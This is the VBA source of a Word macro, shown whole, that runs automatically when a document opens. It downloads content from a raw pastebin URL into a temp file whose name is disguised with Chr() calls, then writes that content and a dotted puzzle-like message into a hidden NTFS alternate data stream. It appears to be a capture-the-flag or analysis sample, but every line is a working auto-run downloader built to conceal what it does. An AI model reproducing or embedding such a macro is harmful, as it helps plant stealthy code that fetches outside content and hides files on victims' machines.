Sub Document_Open()

Dim filePath As String, myURL As String, myPath As String
filePath = Environ("temp") + "\" + Chr(108) + "i" + Chr(103) + "h" + Chr(116) _
    + "speed" + Chr(46) + Chr(116) + "x" + Chr(116)
myURL = "https://pastebin.com/"
myPath = "raw/J6YCXPCM"

Dim WinHttpReq As Object
Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
WinHttpReq.Open "GET", myURL + myPath, False
WinHttpReq.Send

myURL = WinHttpReq.ResponseBody
If WinHttpReq.Status = 200 Then
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Open
    oStream.Type = 1
    oStream.Write WinHttpReq.ResponseBody
    oStream.SaveToFile filePath, 2
    oStream.Close
End If

Dim text As String, textline As String, posLat As Integer, posLong As Integer
Open filePath For Input As #1
Do Until EOF(1)
    Line Input #1, textline
    text = text & textline & Chr$(13) & Chr$(10)
Loop
Close #1

Open filePath + ":woohoo.txt" For Output As #1
Print #1, text + "w.i.t.f.t.f.i.h.b.i.l.s.d.y.l.s.t.s.w.c. _
    y.........w.........f.i.?.......g.b.m............n.h"
Print #1, "h.s.h.l.h.l.s.e.e...o.a.o.o.o.a.o.o.h.a.o...... _
    ...h.........i.t.?.......o.a.o............o.e"
Print #1, "e...e.a.e.a...r.c...v.l...u.v.l.o.m.e.n.u...... _
    ...o.........n...?.........c.r............t.r"
Print #1, "r.....g...g...e.a...e.m.....e.m.?.e.r.......... _
    ...o.........d...?.........k.e..............e"
Print #1, "e...............u.....o.......o.....e.......... _
    ...p........................................."
Print #1, "................s.....n.......n................ _
    ...s........................................."
Print #1, "................e.....!........................ _
    ............................................."
Print #1, "}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}} _
    }}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}"
Close #1

End Sub
